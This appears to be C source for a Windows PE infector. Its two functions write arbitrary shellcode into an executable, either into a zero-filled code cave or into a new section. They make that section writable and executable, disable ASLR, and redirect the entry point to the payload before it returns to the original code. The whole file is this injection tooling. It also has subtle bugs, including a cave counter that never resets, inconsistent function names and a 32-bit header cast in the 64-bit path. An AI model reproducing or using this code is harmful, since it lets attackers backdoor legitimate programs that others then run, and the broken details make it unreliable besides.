#include "pe.h"
int PE_code_cave(char *file_name, char *shellcode ,int shellcode_len){
    uint32_t vaddr;
    uint64_t oryginal_entry;
    uint32_t size;
    uint16_t machine_type;
    
   char *pe = load_file(file_name,&size);
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pe;
    PIMAGE_FILE_HEADER file_header = (PIMAGE_FILE_HEADER)(pe + dos->e_lfanew + 4);
    machine_type = file_header->Machine;
                if (machine_type == 0x14C) { // Check if 32-bit PE file
        PIMAGE_NT_HEADERS32 nt = (PIMAGE_NT_HEADERS32)(pe + dos->e_lfanew);
        oryginal_entry = nt->OptionalHeader.AddressOfEntryPoint + nt->OptionalHeader.ImageBase;
        nt->OptionalHeader.DllCharacteristics &= ~0x0040;

        PIMAGE_SECTION_HEADER next = (PIMAGE_SECTION_HEADER)(pe + dos->e_lfanew + sizeof(IMAGE_NT_HEADERS32));

        for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
            unsigned long offset = next[i].PointerToRawData;
            DWORD count = 0;

            for (int j = 0; j < next[i].SizeOfRawData; j++) {
                if (pe[offset] == 0x00) {
                    offset += 1;
                    count += 1;

                    if (count == (shellcode_len + 5)) {
                        offset -= count;
                        next[i].Misc.VirtualSize += count;
                        next[i].Characteristics |= 0x80000000 | 0x40000000 | 0x20000000;

                     
                        vaddr = offset + next[i].VirtualAddress - next[i].PointerToRawData;
                        nt->OptionalHeader.AddressOfEntryPoint = vaddr;

                        char *payload = apply_suffix(shellcode, shellcode_len, oryginal_entry, vaddr);

                        if(write_data(file_name, 0, pe, size)==-1){
                            free(pe);
                            free(payload);
                            return -1;
                        }; 

                        if(write_data(file_name, offset, payload, count)==-1){
                            free(pe);
                            free(payload);
                            return -1;
                        }; 

                        free(pe);
                        free(payload);

                        return 0;
                    }
                }
                
            }
            next++;
        }
        
    }
    if (machine_type ==  0x8664) { 
        PIMAGE_NT_HEADERS64 nt64 = (PIMAGE_NT_HEADERS64)(pe + dos->e_lfanew);
        oryginal_entry = nt64->OptionalHeader.AddressOfEntryPoint + nt64->OptionalHeader.ImageBase;
        nt64->OptionalHeader.DllCharacteristics &= ~0x0040;

        PIMAGE_SECTION_HEADER next = (PIMAGE_SECTION_HEADER)(pe + dos->e_lfanew + sizeof(IMAGE_NT_HEADERS64));

        for (int i = 0; i < nt64->FileHeader.NumberOfSections; i++) {
            unsigned long offset = next[i].PointerToRawData;
            DWORD count = 0;

            for (int j = 0; j < next[i].SizeOfRawData; j++) {
                if (pe[offset] == 0x00) {
                    offset += 1;
                    count += 1;

                    if (count == (shellcode_len + 5)) {
                        offset -= count;
                        next[i].Misc.VirtualSize += count;
                        next[i].Characteristics |= 0x80000000 | 0x40000000 | 0x20000000;

                        
                        vaddr = offset + next[i].VirtualAddress - next[i].PointerToRawData;
                        nt64->OptionalHeader.AddressOfEntryPoint = vaddr;

                        char *payload = apply_suffix(shellcode, shellcode_len, oryginal_entry, vaddr);

                        
                        if(write_data(file_name, 0, pe, size)==-1){
                            free(pe);
                            free(payload);
                            return -1;
                        }; 

                        if(write_data(file_name, offset, payload, count)==-1){
                            free(pe);
                            free(payload);
                            return -1;
                        }; 

                        free(pe);
                        free(payload);

                        return 0;
                    }
                }
                else{
                    offset +=1;
                    count = 0;
                }
                
            }
            next++;
        }
        
    }
    free(pe);
    return -1;
                }
int PE_new_section(char *file_name,char *section_name,char *shellcode,int shellcode_len){
uint32_t size;
uint16_t machine_type;
uint32_t oryginal_entry;
uint32_t extend;
char *payload;
char *pe = load_file(file_name , &size);
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pe;
    PIMAGE_FILE_HEADER file_header = (PIMAGE_FILE_HEADER)(pe +dos->e_lfanew + 4);
    PIMAGE_SECTION_HEADER next;
    machine_type = file_header->Machine;
    if(machine_type == 0x14C){
    PIMAGE_NT_HEADERS32 nt32 = (PIMAGE_NT_HEADERS32)(pe + dos->e_lfanew);
    oryginal_entry = nt32->OptionalHeader.AddressOfEntryPoint + nt32->OptionalHeader.ImageBase;
    nt32->OptionalHeader.DllCharacteristics &= ~0x0040;

    next = (PIMAGE_SECTION_HEADER)(pe + dos->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
    int NumSections = nt32->FileHeader.NumberOfSections;

    for (int i = 0; i < NumSections; i++) {
        if (!strcmp(next[i].Name, section_name)) {
            free(pe);
            return -1;
        }
    }

    memset(&next[NumSections], 0, sizeof(IMAGE_SECTION_HEADER));
    uint32_t sizeOfSection;
    sizeOfSection = (shellcode_len + 5);
    next[NumSections].Misc.VirtualSize = align(sizeOfSection, nt32->OptionalHeader.SectionAlignment, 0);
    next[NumSections].VirtualAddress = align(next[NumSections - 1].Misc.VirtualSize, nt32->OptionalHeader.SectionAlignment, next[NumSections - 1].VirtualAddress);
    next[NumSections].SizeOfRawData = align(sizeOfSection, nt32->OptionalHeader.FileAlignment, 0);
    next[NumSections].PointerToRawData = align(next[NumSections - 1].SizeOfRawData, nt32->OptionalHeader.FileAlignment, next[NumSections - 1].PointerToRawData);
    next[NumSections].Characteristics |= 0x80000000 | 0x40000000 | 0x20000000;

    nt32->OptionalHeader.AddressOfEntryPoint = next[NumSections].VirtualAddress;
    nt32->FileHeader.NumberOfSections += 1;
    nt32->OptionalHeader.SizeOfImage = next[NumSections].VirtualAddress + next[NumSections].Misc.VirtualSize;
    uint32_t extend = next[NumSections].PointerToRawData +  next[NumSections].SizeOfRawData;
    char *payload = applysuffix(shellcode,shellcode_len,oryginal_entry,next[NumSections].VirtualAddress);
    extend_file(file_name,extend);
    if(write_data(file_name,0,pe,size)==-1){
        free(pe);
        free(payload);
        return -1;
    }
    if(write_data(file_name,next[NumSections].PointerToRawData,payload,shellcode_len+5)==-1){
        free(pe);
        free(payload);
        return -1;
    }
    free(pe);
    free(payload);
    return 0;
    }
    if(machine_type == 0x8664){
        PIMAGE_NT_HEADERS64 nt64 = (PIMAGE_NT_HEADERS32)(pe + dos->e_lfanew);
        oryginal_entry = nt64->OptionalHeader.AddressOfEntryPoint + nt64->OptionalHeader.ImageBase;
        nt64->OptionalHeader.DllCharacteristics &= ~0x0040;
    
        next = (PIMAGE_SECTION_HEADER)(pe + dos->e_lfanew + sizeof(IMAGE_NT_HEADERS64));
        int NumSections = nt64->FileHeader.NumberOfSections;
    
        for (int i = 0; i < NumSections; i++) {
            if (!strcmp(next[i].Name, section_name)) {
                free(pe);
                return -1;
            }
        }
    
        memset(&next[NumSections], 0, sizeof(IMAGE_SECTION_HEADER));
        uint32_t sizeOfSection;
        sizeOfSection = (shellcode_len + 5);
        next[NumSections].Misc.VirtualSize = align(sizeOfSection, nt64->OptionalHeader.SectionAlignment, 0);
        next[NumSections].VirtualAddress = align(next[NumSections - 1].Misc.VirtualSize, nt64->OptionalHeader.SectionAlignment, next[NumSections - 1].VirtualAddress);
        next[NumSections].SizeOfRawData = align(sizeOfSection, nt64->OptionalHeader.FileAlignment, 0);
        next[NumSections].PointerToRawData = align(next[NumSections - 1].SizeOfRawData, nt64->OptionalHeader.FileAlignment, next[NumSections - 1].PointerToRawData);
        next[NumSections].Characteristics |= 0x80000000 | 0x40000000 | 0x20000000;
    
        nt64->OptionalHeader.AddressOfEntryPoint = next[NumSections].VirtualAddress;
        nt64->FileHeader.NumberOfSections += 1;
        nt64->OptionalHeader.SizeOfImage = next[NumSections].VirtualAddress + next[NumSections].Misc.VirtualSize;
        extend = next[NumSections].PointerToRawData +  next[NumSections].SizeOfRawData;
        payload = applysuffix(shellcode,shellcode_len,oryginal_entry,next[NumSections].VirtualAddress);
        extend_file(file_name,extend);
        if(write_data(file_name,0,pe,size)==-1){
            free(pe);
            free(payload);
            return -1;
        }
        if(write_data(file_name,next[NumSections].PointerToRawData,payload,shellcode_len+5)==-1){
            free(pe);
            free(payload);
            return -1;
        }
        free(pe);
        free(payload);
        return 0;
    }
    free(pe);
    return -1;
}
